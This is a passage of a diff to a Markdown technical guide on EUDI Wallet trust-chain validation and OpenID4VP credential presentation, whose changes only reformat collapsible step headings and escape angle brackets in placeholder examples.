 The Wallet Instance sends an HTTP GET to the Intermediate's `/.well-known/openid-federation` endpoint. This retrieves the Intermediate's own Entity Configuration, which contains its public keys (needed to verify its Subordinate Statements) and its own `authority_hints` (pointing to the Trust Anchor).
 
 **Audit Telemetry:** The Wallet Instance logs an `INTERMEDIATE_ENTITY_CONFIGURATION_FETCH_INITIATED` event.
 
 </details>
-<details><summary><strong>7. Intermediate returns its Entity Configuration JWT</strong></summary>
+<details>
+<summary><strong>7. Intermediate returns its Entity Configuration JWT</strong></summary>
 
 The Intermediate responds with its self-signed Entity Configuration. The Wallet Instance extracts the Intermediate's `jwks` (for verifying the Subordinate Statement about the Relying Party) and `authority_hints` (for continuing the chain walk upward to the Trust Anchor).
 
 **Artifact Produced:** Intermediate Entity Configuration (JWT).
 
 </details>
-<details><summary><strong>8. Wallet Instance fetches Subordinate Statement about Relying Party from Intermediate</strong></summary>
+<details>
+<summary><strong>8. Wallet Instance fetches Subordinate Statement about Relying Party from Intermediate</strong></summary>
 
 The Wallet Instance queries the Intermediate's Fetch endpoint (`/fetch?sub=https://rp.example.org`) to obtain the Subordinate Statement — the signed JWT that attests the Relying Party is a registered member of the federation under this Intermediate. This is the critical attestation that links the Relying Party to the federation hierarchy.
 
 **Audit Telemetry:** The Wallet Instance logs an `INTERMEDIATE_SUBORDINATE_STATEMENT_FETCH_INITIATED` event.
 
 </details>
-<details><summary><strong>9. Intermediate returns Subordinate Statement about Relying Party</strong></summary>
+<details>
+<summary><strong>9. Intermediate returns Subordinate Statement about Relying Party</strong></summary>
 
 The Intermediate responds with a signed Subordinate Statement JWT. This contains: the Relying Party's public keys (which must match the keys in the Relying Party's Entity Configuration from step 3), optional `metadata_policy` rules (constraints on the Relying Party's metadata, such as allowed VP formats or scope restrictions), and optional Trust Marks. The Wallet Instance verifies this JWT using the Intermediate's keys from step 7.
 
 **Artifact Produced:** Relying Party Subordinate Statement (JWT).
 
 </details>
-<details><summary><strong>10. Wallet Instance fetches Trust Anchor Entity Configuration</strong></summary>
+<details>
+<summary><strong>10. Wallet Instance fetches Trust Anchor Entity Configuration</strong></summary>
 
 Continuing upward, the Wallet Instance fetches the Trust Anchor's Entity Configuration from `/.well-known/openid-federation`. The Wallet Instance typically has the Trust Anchor's public keys pre-configured (distributed out-of-band by the Member State). This is the final HTTP fetch in the chain walk.
 
 **Audit Telemetry:** The Wallet Instance logs a `TRUST_ANCHOR_ENTITY_CONFIGURATION_FETCH_INITIATED` event.
 
 </details>
-<details><summary><strong>11. Trust Anchor returns its Entity Configuration JWT</strong></summary>
+<details>
+<summary><strong>11. Trust Anchor returns its Entity Configuration JWT</strong></summary>
 
 The Trust Anchor responds with its Entity Configuration. The Wallet Instance verifies this JWT using its pre-configured Trust Anchor public keys — this is the **root of trust** anchoring the entire chain. 
 
@@ -3315,21 +3370,24 @@ The Trust Anchor responds with its Entity Configuration. The Wallet Instance ver
 **Audit Telemetry:** The Wallet Instance logs a `TRUST_ANCHOR_SIGNATURE_VERIFIED` event or failure alert.
 
 </details>
-<details><summary><strong>12. Wallet Instance fetches Subordinate Statement about Intermediate from Trust Anchor</strong></summary>
+<details>
+<summary><strong>12. Wallet Instance fetches Subordinate Statement about Intermediate from Trust Anchor</strong></summary>
 
 The Wallet Instance queries the Trust Anchor's Fetch endpoint to obtain the Subordinate Statement attesting the Intermediate's membership in the federation. This completes the chain: Relying Party → Intermediate → Trust Anchor.
 
 **Audit Telemetry:** The Wallet Instance logs a `TA_SUBORDINATE_STATEMENT_FETCH_INITIATED` event.
 
 </details>
-<details><summary><strong>13. Trust Anchor returns Subordinate Statement about Intermediate</strong></summary>
+<details>
+<summary><strong>13. Trust Anchor returns Subordinate Statement about Intermediate</strong></summary>
 
 The Trust Anchor responds with a signed Subordinate Statement about the Intermediate, containing the Intermediate's public keys. The Wallet Instance verifies this using the Trust Anchor's keys from step 11.
 
 **Artifact Produced:** Intermediate Subordinate Statement (JWT).
 
 </details>
-<details><summary><strong>14. Wallet Instance validates the complete trust chain</strong></summary>
+<details>
+<summary><strong>14. Wallet Instance validates the complete trust chain</strong></summary>
 
 With all chain components assembled — [Relying Party Entity Configuration, Subordinate Statement from Intermediate, Intermediate Entity Configuration, Subordinate Statement from Trust Anchor, Trust Anchor Entity Configuration] — the Wallet Instance performs comprehensive validation: (a) signature integrity at each level, (b) temporal validity (`iat`/`exp`) for every JWT, (c) issuer-subject binding (each `iss` must match the expected superior, each `sub` must match the expected subordinate), (d) key consistency (the Relying Party's keys in the Subordinate Statement must match those in its Entity Configuration).
 
@@ -3338,19 +3396,22 @@ With all chain components assembled — [Relying Party Entity Configuration, Sub
 **Audit Telemetry:** The Wallet Instance logs a `TRUST_CHAIN_VALIDATION_COMPLETED` event.
 
 </details>
-<details><summary><strong>15. Wallet Instance applies metadata policies from Trust Anchor downward</strong></summary>
+<details>
+<summary><strong>15. Wallet Instance applies metadata policies from Trust Anchor downward</strong></summary>
 
 Metadata policies from each Subordinate Statement are applied in cascade — from Trust Anchor downward through Intermediates to the Relying Party. Operators like `subset_of`, `one_of`, `add`, and `default` constrain the Relying Party's declared metadata. For example, the Trust Anchor might enforce `vp_formats` to include only `dc+sd-jwt` with `ES256`/`ES384`, overriding any broader format declarations by the Relying Party.
 
 </details>
-<details><summary><strong>16. Wallet Instance derives Relying Party's final metadata</strong></summary>
+<details>
+<summary><strong>16. Wallet Instance derives Relying Party's final metadata</strong></summary>
 
 After policy application, the Wallet Instance has the Relying Party's **final metadata** — the effective set of capabilities the Relying Party is authorised to use within the federation. This includes: which VP formats the Relying Party may accept, which attribute scopes it may request, which client authentication methods it supports, and its organisation information (name, logo, contacts). The Wallet Instance uses this metadata to evaluate the presentation request from step 1.
 
 **Audit Telemetry:** The Wallet Instance logs a `RP_FINAL_METADATA_DERIVED` event.
 
 </details>
-<details><summary><strong>17. Wallet Instance validates Trust Marks (optional)</strong></summary>
+<details>
+<summary><strong>17. Wallet Instance validates Trust Marks (optional)</strong></summary>
 
 If the Relying Party's Entity Configuration or Subordinate Statements contain Trust Marks, the Wallet Instance may optionally validate them by querying the Trust Mark Status endpoint (`/status`). Trust Marks provide fine-grained authorisation signals — e.g., "this Relying Party is certified for LoA High interactions" or "this Relying Party may interact with minors". Trust Mark validation is optional because federation membership (established in steps 14–16) already provides baseline trust.
 
@@ -3591,7 +3652,7 @@ Key decision points:
 An SD-JWT VC consists of three parts, serialised as a single string separated by tildes (`~`):
 
 ```
-<Issuer-signed JWT>~<Disclosure 1>~<Disclosure 2>~...~<Key Binding JWT>
+&lt;Issuer-signed JWT>~&lt;Disclosure 1>~&lt;Disclosure 2>~...~&lt;Key Binding JWT>
 ```
 
 | Component | Purpose |
@@ -4770,7 +4831,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Relying Party calls navigator.credentials.get()</strong></summary>
+<details>
+<summary><strong>1. Relying Party calls navigator.credentials.get()</strong></summary>
 
 The Relying Party initiates the presentation flow by constructing a standard OpenID4VP request packaged as a signed JWT Secured Authorization Request (JAR). To ensure the browser mediates this request securely without revealing installed wallets, the Relying Party invokes the W3C Digital Credentials API (DC-API).
 
@@ -4779,7 +4841,7 @@ navigator.credentials.get({
   digital: {
     providers: [{
       protocol: "openid4vp",
-      request: "ey...<SIGNED_JAR>...hw"
+      request: "ey...&lt;SIGNED_JAR>...hw"
     }]
   }
 })
@@ -4799,7 +4861,8 @@ Inside the `SIGNED_JAR`, the Relying Party defines its exact presentation requir
 
 </details>
 
-<details><summary><strong>2. Browser forwards credential request to OS Credential Manager</strong></summary>
+<details>
+<summary><strong>2. Browser forwards credential request to OS Credential Manager</strong></summary>
 
 The Browser intercepts the API call and immediately enforces strict, client-side security heuristics:
 1. **Origin Validation:** Ensures the calling script matches the verified top-level domain, preventing Cross-Site Scripting (XSS) subversion.
@@ -4812,7 +4875,8 @@ Upon successful validation, the Browser passes the raw JAR payload to the underl
 
 </details>
 
-<details><summary><strong>3. OS Credential Manager invokes Wallet selector</strong></summary>
+<details>
+<summary><strong>3. OS Credential Manager invokes Wallet selector</strong></summary>
 
 The OS natively enumerates all installed wallet applications capable of handling the requested protocol (e.g., `openid4vp`). However, to preserve strict privacy boundaries, the OS **does not natively inspect individual credentials** to filter them.
 
@@ -4828,7 +4892,8 @@ Instead, the filtering logic is delegated to **WebAssembly (Wasm) Matchers**:
 
 </details>
 
-<details><summary><strong>4. Wallet Instance verifies Relying Party identity and requests User consent</strong></summary>
+<details>
+<summary><strong>4. Wallet Instance verifies Relying Party identity and requests User consent</strong></summary>
 
 The selected Wallet Instance receives the OpenID4VP JAR from the OS. Before displaying anything to the User, the Wallet Instance performs strict identity verification on the Relying Party:
 
@@ -4844,7 +4909,8 @@ Once verified, the Wallet Instance displays a consent screen detailing exactly w
 
 </details>
 
-<details><summary><strong>5. Wallet Instance returns encrypted Verifiable Presentation</strong></summary>
+<details>
+<summary><strong>5. Wallet Instance returns encrypted Verifiable Presentation</strong></summary>
 
 After receiving User consent, the Wallet Instance constructs the Verifiable Presentation (VP) in the required format:
 
@@ -4866,7 +4932,8 @@ Because the Relying Party requested `direct_post.jwt`, the entire presentation p
 
 </details>
 
-<details><summary><strong>6. Relying Party verifies JARM response</strong></summary>
+<details>
+<summary><strong>6. Relying Party verifies JARM response</strong></summary>
 
 The Browser receives the encrypted JWE response from the OS and resolves the Javascript `navigator.credentials.get()` Promise. The Relying Party's front-end forwards this opaque string to its backend services for verification:
 
@@ -5063,7 +5130,8 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. Relying Party Frontend initiates presentation session</strong></summary>
+<details>
+<summary><strong>1. Relying Party Frontend initiates presentation session</strong></summary>
 
 The user interaction originates at the Relying Party Frontend (e.g., a web application or mobile app). When a user action requires authentication or attribute sharing (like submitting a loan application or accessing a restricted portal), the frontend issues an asynchronous HTTP request (AJAX/Fetch) to the Relying Party Backend. This API call signals the backend to initialize a secure OpenID4VP presentation session tailored specifically to the required Level of Assurance (LoA) and requested attributes.
 
@@ -5083,7 +5151,8 @@ Content-Type: application/json
 **Artifact Produced:** Authentication Session State (Pending).
 
 </details>
-<details><summary><strong>2. Relying Party Backend generates P-256 ephemeral key pair</strong></summary>
+<details>
+<summary><strong>2. Relying Party Backend generates P-256 ephemeral key pair</strong></summary>
 
 To cryptographically guarantee **perfect forward secrecy** for the User's highly sensitive attributes (e.g., medical records, financial history), the Relying Party Backend unequivocally eschews static encryption keys. 
 
@@ -5103,7 +5172,8 @@ ephemeral_public_key = ephemeral_private_key.public_key()
 **Artifact Produced:** Ephemeral ECDH-ES Private/Public Key Pair (P-256).
 
 </details>
-<details><summary><strong>3. Relying Party Backend stores ephemeral private key</strong></summary>
+<details>
+<summary><strong>3. Relying Party Backend stores ephemeral private key</strong></summary>
 
 The Relying Party Backend safely "parks" the ephemeral private key while the User interacts with their Wallet Instance, ensuring the key is available when the encrypted payload eventually returns. There are two primary architectural patterns:
 
@@ -5125,7 +5195,8 @@ The Relying Party Backend safely "parks" the ephemeral private key while the Use
 **Artifact Produced:** Persisted Ephemeral Private Key (Stateful Cache or JWE Cookie).
 
 </details>
-<details><summary><strong>4. Relying Party Backend injects ephemeral public key into JAR</strong></summary>
+<details>
+<summary><strong>4. Relying Party Backend injects ephemeral public key into JAR</strong></summary>
 
 The Relying Party builds the OpenID4VP JSON-secured Authorization Request (JAR) and surgically injects the *public* half of the ephemeral key pair directly into the JWT header payload. 
 
@@ -5155,7 +5226,8 @@ Following HAIP specifications, the key is structured as a JSON Web Key (JWK) and
 **Artifact Produced:** OpenID4VP Authorization Request (JAR payload).
 
 </details>
-<details><summary><strong>5. Relying Party Backend returns signed JAR reference to Frontend</strong></summary>
+<details>
+<summary><strong>5. Relying Party Backend returns signed JAR reference to Frontend</strong></summary>
 
 With the ephemeral public key injected, the Relying Party Backend mathematically seals the JAR by signing it with its long-term Access Certificate (WRPAC) private key. 
 
@@ -5173,7 +5245,8 @@ Content-Type: application/json
 ```
 
 </details>
-<details><summary><strong>6. Relying Party Frontend transmits presentation request to Wallet Unit</strong></summary>
+<details>
+<summary><strong>6. Relying Party Frontend transmits presentation request to Wallet Unit</strong></summary>
 
 Armed with the `request_uri`, the Relying Party Frontend bridges the 'air gap' to the User's Wallet Unit. 
 - In a **Cross-Device Flow** (e.g., laptop to phone), the frontend leverages a library to render the OpenID4VP URI as a high-contrast QR code on the desktop monitor.
@@ -5184,7 +5257,8 @@ The User either scans the QR code or clicks the universal button, immediately sh
 **Artifact Produced:** OpenID4VP QR Code or Universal Link.
 
 </details>
-<details><summary><strong>7. Wallet Unit extracts ephemeral public key</strong></summary>
+<details>
+<summary><strong>7. Wallet Unit extracts ephemeral public key</strong></summary>
 
 Upon intercepting the request URI, the Wallet Unit initiates an outbound fetch to download the complete JAR from the Relying Party's endpoint. After rigorously validating the WRPAC signature enveloping the JAR (proving Relying Party authenticity), the Wallet parses the internal payload.
 
@@ -5195,7 +5269,8 @@ It isolates the Relying Party's ephemeral public key from the `client_metadata.j
 **Audit Telemetry:** The Wallet Unit logs an `EPHEMERAL_PUBLIC_KEY_EXTRACTED` event.
 
 </details>
-<details><summary><strong>8. Wallet Unit performs ECDH-ES key agreement</strong></summary>
+<details>
+<summary><strong>8. Wallet Unit performs ECDH-ES key agreement</strong></summary>
 
 Following the user's explicit consent to share the requested attributes (e.g., acknowledging the ✅ trust UI), the Wallet Unit mathematically derives the symmetric encryption keys capable of securing the payload in transit. 
 
@@ -5210,7 +5285,8 @@ CEK = HKDF(Shared_Secret, Algorithm="A256GCM")
 **Artifact Produced:** Ephemeral Symmetric Content Encryption Key (CEK).
 
 </details>
-<details><summary><strong>9. Wallet Unit encrypts response to JWE</strong></summary>
+<details>
+<summary><strong>9. Wallet Unit encrypts response to JWE</strong></summary>
 
 The Wallet Unit marshals the final authorized payload (the SD-JWT VC `vp_token`, user disclosures, KB-JWT, and `presentation_submission` map). It processes this JSON string through an authenticated encryption cipher (typically `A256GCM`) using the symmetric CEK derived in Step 8.
 
@@ -5230,7 +5306,8 @@ This strict architectural mandate guarantees End-to-End Encryption (E2EE) at the
 **Artifact Produced:** Encrypted JWE containing Verifiable Presentation.
 
 </details>
-<details><summary><strong>10. Wallet Unit POSTs encrypted JWE to response_uri</strong></summary>
+<details>
+<summary><strong>10. Wallet Unit POSTs encrypted JWE to response_uri</strong></summary>
 
 With the payload successfully encrypted into a self-contained JWE, the Wallet Unit transmits it back to the Relying Party. It issues a direct `POST` request to the `response_uri` defined in the original JAR, transmitting the payload securely as `application/x-www-form-urlencoded`.
 
@@ -5249,7 +5326,8 @@ At this precise milestone, the Wallet Unit completes its operational duty and gr
 **Artifact Produced:** Encrypted Presentation Payload delivered to backend.
 
 </details>
-<details><summary><strong>11. Relying Party Backend retrieves ephemeral private key</strong></summary>
+<details>
+<summary><strong>11. Relying Party Backend retrieves ephemeral private key</strong></summary>
 
 The Relying Party Backend API ingests the incoming POST request. To decrypt the JWE, it first desperately requires the ephemeral private key it generated back in Step 2. 
 
@@ -5260,7 +5338,8 @@ The backend parses the `state` parameter from the HTTP body. Using this correlat
 **Artifact Produced:** Retrieved session-bound Ephemeral Private Key.
 
 </details>
-<details><summary><strong>12. Session Cache returns ephemeral private key</strong></summary>
+<details>
+<summary><strong>12. Session Cache returns ephemeral private key</strong></summary>
 
 If the session remains valid, the high-speed caching tier successfully returns the serialized ephemeral private key back into the active application memory. 
 
@@ -5269,7 +5348,8 @@ At this fragile stage, the decrypted key material resides in system RAM. Applica
 **Artifact Produced:** In-Memory Ephemeral Private Key (Cleartext).
 
 </details>
-<details><summary><strong>13. Relying Party Backend decrypts JWE</strong></summary>
+<details>
+<summary><strong>13. Relying Party Backend decrypts JWE</strong></summary>
 
 The Relying Party Backend executes the mirror image of the Wallet's cryptography. 
 1. It extracts the Wallet's ephemeral public key (`epk`) from the JWE header.
@@ -5297,7 +5377,8 @@ If the Authentication Tag (`tag`) verification succeeds, the decryption yields t
 **Artifact Produced:** Decrypted cleartext Verifiable Presentation (`vp_token` and disclosures).
 
 </details>
-<details><summary><strong>14. Relying Party Backend cryptographically erases ephemeral private key</strong></summary>
+<details>
+<summary><strong>14. Relying Party Backend cryptographically erases ephemeral private key</strong></summary>
 
 The absolute instant the JWE is successfully decrypted, the Relying Party is mathematically mandated to execute a permanent "kill order" on the ephemeral private key. 
 
@@ -5567,14 +5648,16 @@ sequenceDiagram
     end
 ```
 
-<details><summary><strong>1. User accesses Relying Party service via browser</strong></summary>
+<details>
+<summary><strong>1. User accesses Relying Party service via browser</strong></summary>
 
 The User navigates to the Relying Party's web service using their device's Browser (Chrome, Safari, Firefox, or Samsung Internet). The User may be initiating a new customer onboarding (§22 CDD), authenticating to an existing account (§15 SCA flow), or accessing a service that requires age or identity verification. This is a standard HTTP navigation — the User does not need to know that EUDI Wallet verification will be involved until the Relying Party triggers it.
 
 > **Same-device prerequisite**: The EUDI Wallet application must be installed on the same device as the Browser. If the Wallet Unit is not installed, the Browser's DC API will throw a `NotSupportedError`, and the Relying Party should fall back to the cross-device flow (§10.2) or display a "Please install your EUDI Wallet" prompt.
 
 </details>
-<details><summary><strong>2. Browser sends HTTP request to Relying Party Backend</strong></summary>
+<details>
+<summary><strong>2. Browser sends HTTP request to Relying Party Backend</strong></summary>
 
 The Browser sends an HTTP request to the Relying Party Backend (e.g., `GET /login` or `POST /onboarding/start`). The Relying Party Backend determines that EUDI Wallet verification is required for this route — either because it's a protected resource requiring authentication, or because the business logic requires identity data (e.g., KYC). The backend initiates the OpenID4VP session creation process (steps 3–5) and stores the session state server-side, keyed by the `state` parameter.
 
@@ -5583,7 +5666,8 @@ The Browser sends an HTTP request to the Relying Party Backend (e.g., `GET /logi
 **Artifact Produced:** Authentication Session State (Pending).
 
 </details>
-<details><summary><strong>3. Relying Party Backend generates nonce, state, and ephemeral ECDH keys</strong></summary>
+<details>
+<summary><strong>3. Relying Party Backend generates nonce, state, and ephemeral ECDH keys</strong></summary>
 
 The Relying Party Backend generates three cryptographic parameters for the OpenID4VP session:
 
@@ -5598,7 +5682,8 @@ The Relying Party Backend generates three cryptographic parameters for the OpenI
 > **Forward secrecy**: The ephemeral ECDH pattern (HAIP 1.0 §6.4) provides per-session forward secrecy. The Relying Party MUST NOT reuse the same ephemeral key pair across multiple sessions.
 
 </details>
-<details><summary><strong>4. Relying Party Backend builds DCQL query</strong></summary>
+<details>
+<summary><strong>4. Relying Party Backend builds DCQL query</strong></summary>
 
 The Relying Party constructs a Digital Credentials Query Language (DCQL) query specifying precisely which credentials and claims are required. DCQL (defined in OID4VP Draft 28+, mandated by HAIP 1.0) replaces the older Presentation Exchange (PEX) format with a simpler, JSON-native query syntax:
 
@@ -5611,7 +5696,8 @@ The Relying Party should request **only the minimum attributes** needed for its 
 **Artifact Produced:** DCQL Query definition (JSON object).
 
 </details>
-<details><summary><strong>5. Relying Party Backend creates JAR signed with WRPAC key</strong></summary>
+<details>
+<summary><strong>5. Relying Party Backend creates JAR signed with WRPAC key</strong></summary>
 
 The Relying Party builds the `vp_token` Request Object, signs it with its WRPAC private key to create a JWT-Secured Authorization Request (JAR), and embeds the `x509_hash` client identification alongside the ephemeral public key (`response_encryption_jwk`).
 
@@ -5662,7 +5748,8 @@ The Relying Party builds the `vp_token` Request Object, signs it with its WRPAC 
 **Artifact Produced:** OpenID4VP Authorization Request (Signed JAR payload).
 
 </details>
-<details><summary><strong>6. Relying Party Frontend invokes Wallet Unit via W3C DC API</strong></summary>
+<details>
+<summary><strong>6. Relying Party Frontend invokes Wallet Unit via W3C DC API</strong></summary>
 
 The Relying Party passes the constructed presentation request to the User's Browser via the W3C Digital Credentials (DC) API to invoke the local EUDI Wallet Unit.
 
@@ -5675,7 +5762,7 @@ const credential = await navigator.credentials.get({
     providers: [{
       protocol: "openid4vp",
       request: {
-        request: "<JWS compact serialization of JAR above>"
+        request: "&lt;JWS compact serialization of JAR above>"
       }
     }]
   }
@@ -5709,7 +5796,8 @@ The browser enforces **origin binding**: it verifies that the calling origin mat
 **Artifact Produced:** Browser DC API Promise (Pending Wallet Unit Response).
 
 </details>
-<details><summary><strong>7. Browser forwards presentation request to Wallet Unit</strong></summary>
+<details>
+<summary><strong>7. Browser forwards presentation request to Wallet Unit</strong></summary>
 
 The Browser intercepts the DC API call and routes the presentation request to the locally installed EUDI Wallet Unit application. The OS-level handoff mechanism is platform-specific:
 
@@ -5721,7 +5809,8 @@ The User does not see this handoff explicitly — the Wallet Unit launches direc
 **Artifact Produced:** OS-Level Presentation Intent payload.
 
 </details>
-<details><summary><strong>8. Wallet Unit verifies JAR signature against WRPAC</strong></summary>
+<details>
+<summary><strong>8. Wallet Unit verifies JAR signature against WRPAC</strong></summary>
 
 The Wallet Unit cryptographically verifies the JAR (JWT-Secured Authorization Request) using the public key from the embedded WRPAC certificate. The verification process:
 
@@ -5737,7 +5826,8 @@ The Wallet Unit cryptographically verifies the JAR (JWT-Secured Authorization Re
 **Audit Telemetry:** The Wallet Unit triggers an internal `WRPAC_SIGNATURE_VERIFIED` or `WRPAC_SIGNATURE_INVALID` state.
 
 </details>
-<details><summary><strong>9. Wallet Unit validates WRPAC certificate chain via LoTE</strong></summary>
+<details>
+<summary><strong>9. Wallet Unit validates WRPAC certificate chain via LoTE</strong></summary>
 
 The Wallet Unit validates the WRPAC's X.509 certificate chain against the Access CA trust anchor from the national LoTE (§5.5.2). The chain verification steps:
 
@@ -5752,7 +5842,8 @@ For same-device flows, the Browser additionally verifies that the calling web or
 **Artifact Produced:** Confirmed WRPAC Origin Binding and LoTE Trust validation state.
 
 </details>
-<details><summary><strong>10. Wallet Unit checks WRPAC revocation status</strong></summary>
+<details>
+<summary><strong>10. Wallet Unit checks WRPAC revocation status</strong></summary>
 
 The Wallet Unit checks whether the WRPAC has been suspended or revoked by the issuing Access Certificate Authority. Two mechanisms are supported:
 
@@ -5766,7 +5857,8 @@ The Wallet Unit checks whether the WRPAC has been suspended or revoked by the is
 **Audit Telemetry:** The Wallet Unit logs a `WRPAC_REVOCATION_CHECKED` event.
 
 </details>
-<details><summary><strong>11. Wallet Unit extracts Relying Party identity from WRPAC</strong></summary>
+<details>
+<summary><strong>11. Wallet Unit extracts Relying Party identity from WRPAC</strong></summary>
 
 The Wallet Unit extracts the Relying Party's human-readable identity from the WRPAC certificate to display on the consent screen (step 13). The identity fields are sourced from the certificate's Subject and Subject Alternative Name extensions:
 
@@ -5779,7 +5871,8 @@ If the Relying Party includes a WRPRC (§3.3.1), the Wallet Unit can also extrac
 **Artifact Produced:** Extracted Relying Party Identity Metadata (for UI rendering).
 
 </details>
-<details><summary><strong>12. Wallet Unit evaluates disclosure policy against DCQL request</strong></summary>
+<details>
+<summary><strong>12. Wallet Unit evaluates disclosure policy against DCQL request</strong></summary>
 
 The Wallet Unit evaluates the Relying Party's DCQL query against multiple policy layers before presenting the consent screen:
 
@@ -5794,7 +5887,8 @@ If any policy check fails irrecoverably (e.g., credential not available, EDP blo
 **Artifact Produced:** Evaluated Disclosure Policy result map.
 
 </details>
-<details><summary><strong>13. Wallet Unit displays consent screen to User</strong></summary>
+<details>
+<summary><strong>13. Wallet Unit displays consent screen to User</strong></summary>
 
 The Wallet Unit displays a consent screen summarising the presentation request. The screen must include (per Art. 5a(4)(b) and CIR 2024/2979 Art. 5):
 
@@ -5809,7 +5903,8 @@ The consent screen is rendered within the Wallet Unit's secure UI context — no
 **Artifact Produced:** Rendered Consent Screen UI.
 
 </details>
-<details><summary><strong>14. User approves attribute disclosure</strong></summary>
+<details>
+<summary><strong>14. User approves attribute disclosure</strong></summary>
 
 The User reviews the consent screen and taps to approve sharing the listed attributes. This is the **User sovereignty** step (Art. 5a(4)(b)) — the User can:
 
@@ -5822,7 +5917,8 @@ The User reviews the consent screen and taps to approve sharing the listed attri
 **Artifact Produced:** User Disclosure Consent Granted (Boolean Map).
 
 </details>
-<details><summary><strong>15. Wallet Unit authenticates User via biometric or PIN</strong></summary>
+<details>
+<summary><strong>15. Wallet Unit authenticates User via biometric or PIN</strong></summary>
 
 The Wallet enforces High Level of Assurance (LoA High) by requiring local User authentication to unlock the WSCA (Wallet Secure Cryptographic Application) that protects the credential's private keys. The authentication method depends on the device's capabilities:
 
@@ -5835,12 +5931,13 @@ The WSCA only releases the private key for signing (step 16) after successful au
 **Artifact Produced:** Unlocked Wallet Secure Cryptographic Application (WSCA) context.
 
 </details>
-<details><summary><strong>16. Wallet Unit builds vp_token with SD-JWT VC and KB-JWT</strong></summary>
+<details>
+<summary><strong>16. Wallet Unit builds vp_token with SD-JWT VC and KB-JWT</strong></summary>
 
 The Wallet Unit structures the response payload, selectively disclosing only the approved attributes and generating the Key Binding JWT (KB-JWT) to prove device possession.
 
 ```
-<Issuer-signed JWT>~<Disclosure:family_name>~<Disclosure:given_name>~<Disclosure:birth_date>~<Disclosure:age_over_18>~<KB-JWT>
+&lt;Issuer-signed JWT>~&lt;Disclosure:family_name>~&lt;Disclosure:given_name>~&lt;Disclosure:birth_date>~&lt;Disclosure:age_over_18>~&lt;KB-JWT>
 ```
 
 Key Binding JWT payload:
@@ -5858,7 +5955,8 @@ Key Binding JWT payload:
 **Artifact Produced:** Key Binding JWT (KB-JWT) and Selective Disclosures (`vp_token`).
 
 </details>
-<details><summary><strong>17. Wallet Unit encrypts Verifiable Presentation into JWE</strong></summary>
+<details>
+<summary><strong>17. Wallet Unit encrypts Verifiable Presentation into JWE</strong></summary>
 
 The Wallet Unit encrypts the presentation response (containing the `vp_token`, `presentation_submission`, and `state`) into a JWE using the Relying Party's ephemeral ECDH-ES public key from step 5's `response_encryption_jwk`. The encryption parameters (mandated by HAIP 1.0 §6.4):
 
@@ -5871,7 +5969,8 @@ The resulting JWE compact serialisation is a single string: `header.encryptedKey
 **Artifact Produced:** Encrypted Verifiable Presentation (JWE string).
 
 </details>
-<details><summary><strong>18. Wallet Unit POSTs encrypted response to Relying Party response_uri</strong></summary>
+<details>
+<summary><strong>18. Wallet Unit POSTs encrypted response to Relying Party response_uri</strong></summary>
 
 The Wallet Unit sends the encrypted presentation response directly to the Relying Party's backend `response_uri`.
 
@@ -5882,13 +5981,14 @@ POST /oid4vp/callback HTTP/1.1
 Host: verifier.example-bank.de
 Content-Type: application/x-www-form-urlencoded
 
-response=<JWE compact serialization>
+response=&lt;JWE compact serialization>
 ```
 
 **Artifact Produced:** Encrypted Presentation Payload delivered to Relying Party.
 
 </details>
-<details><summary><strong>19. Relying Party Backend decrypts JWE response</strong></summary>
+<details>
+<summary><strong>19. Relying Party Backend decrypts JWE response</strong></summary>
 
 The Relying Party Backend retrieves the previously stored ephemeral private key (matching the `state`), decrypts the JWE, and instantly destroys the private key to uphold forward secrecy.
 
@@ -5896,7 +5996,7 @@ Decrypted JWE payload:
 
 ```json
 {
-  "vp_token": "<SD-JWT VC string as above>",
+  "vp_token": "&lt;SD-JWT VC string as above>",
   "presentation_submission": {
     "id": "submission-1",
     "definition_id": "dcql-query-1",
@@ -5912,12 +6012,13 @@ Decrypted JWE payload:
 }
 ```
 
-> **DCQL response format vs Presentation Exchange (PEX)**: The `presentation_submission` with `descriptor_map` shown above follows the legacy DIF Presentation Exchange (PEX) format. This structure persists in OpenID4VP 1.0 solely for backward compatibility with non-EUDI implementations. **The EUDI Wallet ecosystem Architecture and Reference Framework (ARF) formally deprecates PEX.** Since HAIP 1.0 mandates DCQL, the authoritative response format keys credentials directly by their DCQL query `id` in the `vp_token` — e.g., `{"vp_token": {"pid": "<SD-JWT VC string>"}, "state": "..."}`. Relying Parties building specifically for EUDI must drop PEX validation and use the DCQL-native response format as the primary parsing path.
+> **DCQL response format vs Presentation Exchange (PEX)**: The `presentation_submission` with `descriptor_map` shown above follows the legacy DIF Presentation Exchange (PEX) format. This structure persists in OpenID4VP 1.0 solely for backward compatibility with non-EUDI implementations. **The EUDI Wallet ecosystem Architecture and Reference Framework (ARF) formally deprecates PEX.** Since HAIP 1.0 mandates DCQL, the authoritative response format keys credentials directly by their DCQL query `id` in the `vp_token` — e.g., `{"vp_token": {"pid": "&lt;SD-JWT VC string>"}, "state": "..."}`. Relying Parties building specifically for EUDI must drop PEX validation and use the DCQL-native response format as the primary parsing path.
 
 **Artifact Produced:** Decrypted cleartext Verifiable Presentation (`vp_token` string).
 
 </details>
-<details><summary><strong>20. Relying Party Backend verifies SD-JWT and KB-JWT signatures</strong></summary>
+<details>
+<summary><strong>20. Relying Party Backend verifies SD-JWT and KB-JWT signatures</strong></summary>
 
 The Relying Party Backend performs the full cryptographic verification pipeline (§5.4.2 steps 2 and 5):
 
@@ -5939,7 +6040,8 @@ Both signatures must pass for the verification to succeed. See §5.4.2 steps 2 a
 **Artifact Produced:** Validated Subject Attributes, Issuer Signature, and Device Binding state.
 
 </details>
-<details><summary><strong>21. Relying Party Backend checks credential revocation via Status List</strong></summary>
+<details>
+<summary><strong>21. Relying Party Backend checks credential revocation via Status List</strong></summary>
 
 The Relying Party queries the PID Provider's Token Status List using the `status` claim from the Issuer-JWT (§5.4.2 step 3). The Relying Party extracts `status.status_list.uri` and `status.status_list.idx`, fetches the Status List Token JWT from the URI, decompresses the DEFLATE-compressed bitstring, and checks the bit at the specified index. The Status List Token JWT itself is signed by the PID Provider — the Relying Party must verify this signature before trusting the result.
 
@@ -5948,7 +6050,8 @@ For production deployments, the Relying Party should **cache** the Status List T
 **Artifact Produced:** Fetched Status List Token JWT.
 
 </details>
-<details><summary><strong>22. Status List confirms credential validity to Relying Party Backend</strong></summary>
+<details>
+<summary><strong>22. Status List confirms credential validity to Relying Party Backend</strong></summary>
 
